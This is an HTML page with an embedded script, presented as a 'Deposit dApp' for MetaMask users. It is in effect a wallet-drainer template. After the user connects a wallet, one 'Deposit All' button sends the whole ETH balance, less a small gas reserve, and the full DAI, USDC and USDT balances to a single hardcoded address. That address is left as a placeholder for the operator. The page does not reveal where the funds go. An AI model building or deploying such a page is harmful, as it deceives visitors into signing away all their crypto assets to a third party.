<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Deposit dApp</title>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
  <meta name="theme-color" content="#fff"/>
  <meta name="description" content="MetaMask-integrated deposit tool.">
  <link rel="shortcut icon" type="image/png" href="/favicon.png"/>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Roboto&display=swap" rel="stylesheet">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: 'Roboto', sans-serif;
      background: radial-gradient(100% 100% at 50% 0, rgba(255,184,226,0) 0, rgba(255,255,255,0) 100%), #fff;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    h1 {
      font-family: 'Orbitron', sans-serif;
      color: #202020;
      font-size: 2rem;
      margin-bottom: 20px;
    }
    button {
      font-size: 1rem;
      padding: 12px 24px;
      margin: 10px;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      background-color: #0074f0;
      color: white;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #005ac1;
    }
    #status {
      margin-top: 15px;
      font-size: 0.95rem;
      color: #333;
    }
  </style>
</head>
<body>
  <h1>ðŸš€ Deposit Interface</h1>
  <button id="connect">ðŸ”Œ Connect Wallet</button>
  <button id="depositAll">ðŸ’¸ Deposit All</button>
  <div id="status">Status: Not connected</div>

  <script src="ethers.min.js"></script>
  <script>
    console.log("Script loaded");

    document.addEventListener("DOMContentLoaded", function () {
      const depositAddress = "0xYourWalletAddress"; // Replace this

      let provider, signer, userAddress;
      const status = document.getElementById("status");

      document.getElementById("connect").onclick = async () => {
        console.log("Connect button clicked");
        if (window.ethereum && window.ethereum.isMetaMask) {
          try {
            await ethereum.request({ method: "eth_requestAccounts" });
            provider = new ethers.providers.Web3Provider(window.ethereum);
            signer = provider.getSigner();
            userAddress = await signer.getAddress();
            status.textContent = "Connected: " + userAddress;
          } catch (err) {
            console.error("Connection failed", err);
            status.textContent = "Connection failed: " + err.message;
          }
        } else {
          status.textContent = "MetaMask not detected.";
        }
      };

      async function sendETH() {
        const balance = await provider.getBalance(userAddress);
        const gasReserve = ethers.utils.parseEther("0.002");
        const amountToSend = balance.sub(gasReserve);
        if (amountToSend.gt(0)) {
          const tx = await signer.sendTransaction({ to: depositAddress, value: amountToSend });
          await tx.wait();
        }
      }

      async function transferToken(tokenAddress) {
        const abi = [
          "function balanceOf(address) view returns (uint)",
          "function transfer(address to, uint amount) returns (bool)",
          "function decimals() view returns (uint8)"
        ];
        const token = new ethers.Contract(tokenAddress, abi, signer);
        const balance = await token.balanceOf(userAddress);
        if (balance.gt(0)) {
          const tx = await token.transfer(depositAddress, balance);
          await tx.wait();
        }
      }

      async function getTokenList() {
        return [
          "0x6B175474E89094C44Da98b954EedeAC495271d0F", // DAI
          "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC
          "0xdAC17F958D2ee523a2206206994597C13D831ec7"  // USDT
        ];
      }

      document.getElementById("depositAll").onclick = async () => {
        if (!signer) {
          status.textContent = "Please connect wallet first.";
          return;
        }

        status.textContent = "Checking balances...";

        const ethBalance = await provider.getBalance(userAddress);
        console.log("ETH balance:", ethers.utils.formatEther(ethBalance));

        const tokens = await getTokenList();
        for (let token of tokens) {
          const abi = [
            "function balanceOf(address) view returns (uint)",
            "function name() view returns (string)"
          ];
          const tokenContract = new ethers.Contract(token, abi, provider);
          const balance = await tokenContract.balanceOf(userAddress);
          let name = token;
          try {
            name = await tokenContract.name();
          } catch (e) {
            console.warn("Could not fetch name for token", token);
          }
          console.log(`${name} (${token}):`, balance.toString());
        }

        status.textContent = "Attempting transfers...";
        await sendETH();
        for (let token of tokens) {
          try {
            await transferToken(token);
          } catch (e) {
            console.error("Transfer failed:", token, e);
          }
        }

        status.textContent = "All assets attempted to deposit.";
      };
    });
  </script>
</body>
</html>
